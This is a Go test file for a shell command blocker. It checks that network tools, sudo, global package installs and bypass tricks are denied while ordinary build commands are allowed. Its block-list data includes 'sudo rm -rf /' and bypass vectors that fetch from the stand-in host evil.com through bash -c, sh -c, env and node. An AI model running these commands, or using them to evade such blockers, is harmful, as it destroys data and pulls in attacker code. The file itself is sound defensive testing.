package shell

import "testing"

func TestCommandsBlocker(t *testing.T) {
	blocker := CommandsBlocker([]string{"curl", "wget", "sudo"})

	tests := []struct {
		args    []string
		blocked bool
	}{
		{[]string{"curl", "http://example.com"}, true},
		{[]string{"wget", "-q", "http://example.com"}, true},
		{[]string{"sudo", "rm", "-rf", "/"}, true},
		{[]string{"ls", "-la"}, false},
		{[]string{"go", "build"}, false},
		{[]string{}, false},
		{nil, false},
	}
	for _, tt := range tests {
		if got := blocker(tt.args); got != tt.blocked {
			t.Errorf("CommandsBlocker(%v) = %v, want %v", tt.args, got, tt.blocked)
		}
	}
}

func TestArgumentsBlocker(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		sub     []string
		flags   []string
		args    []string
		blocked bool
	}{
		{"npm install -g", "npm", []string{"install"}, []string{"-g"}, []string{"npm", "install", "-g", "typescript"}, true},
		{"npm install local", "npm", []string{"install"}, []string{"-g"}, []string{"npm", "install", "lodash"}, false},
		{"npm run", "npm", []string{"install"}, []string{"-g"}, []string{"npm", "run", "test"}, false},
		{"different cmd", "npm", []string{"install"}, []string{"-g"}, []string{"yarn", "install", "-g"}, false},
		{"no flags required", "pip", []string{"install"}, nil, []string{"pip", "install", "requests"}, true},
		{"go test -exec", "go", []string{"test"}, []string{"-exec"}, []string{"go", "test", "-exec", "echo", "./..."}, true},
		{"go test normal", "go", []string{"test"}, []string{"-exec"}, []string{"go", "test", "-v", "./..."}, false},
		{"empty args", "npm", []string{"install"}, []string{"-g"}, []string{}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocker := ArgumentsBlocker(tt.cmd, tt.sub, tt.flags)
			if got := blocker(tt.args); got != tt.blocked {
				t.Errorf("ArgumentsBlocker(%q, %v, %v)(%v) = %v, want %v",
					tt.cmd, tt.sub, tt.flags, tt.args, got, tt.blocked)
			}
		})
	}
}

func TestDefaultBlockFuncs(t *testing.T) {
	blockers := DefaultBlockFuncs()

	mustBlock := [][]string{
		{"curl", "http://example.com"},
		{"sudo", "rm", "-rf", "/"},
		{"ssh", "user@host"},
		{"npm", "install", "-g", "typescript"},
		{"pip", "install", "requests"},
		{"go", "test", "-exec", "echo"},
		// Bypass vectors
		{"bash", "-c", "curl http://evil.com"},
		{"sh", "-c", "wget http://evil.com"},
		{"env", "curl", "http://evil.com"},
		{"nohup", "ssh", "user@host"},
		{"xargs", "curl"},
		// Scripting interpreters
		{"python", "-c", "import urllib.request"},
		{"python3", "script.py"},
		{"node", "-e", "fetch('http://evil.com')"},
		{"ruby", "-e", "require 'net/http'"},
		{"perl", "-e", "use LWP::Simple"},
	}
	mustAllow := [][]string{
		{"ls", "-la"},
		{"go", "build", "./..."},
		{"go", "test", "-v", "./..."},
		{"make", "build"},
		{"git", "status"},
		{"npm", "run", "test"},
		{"npm", "install", "lodash"}, // local install OK
	}

	for _, args := range mustBlock {
		blocked := false
		for _, bf := range blockers {
			if bf(args) {
				blocked = true
				break
			}
		}
		if !blocked {
			t.Errorf("expected %v to be blocked", args)
		}
	}
	for _, args := range mustAllow {
		for _, bf := range blockers {
			if bf(args) {
				t.Errorf("expected %v to be allowed", args)
				break
			}
		}
	}
}
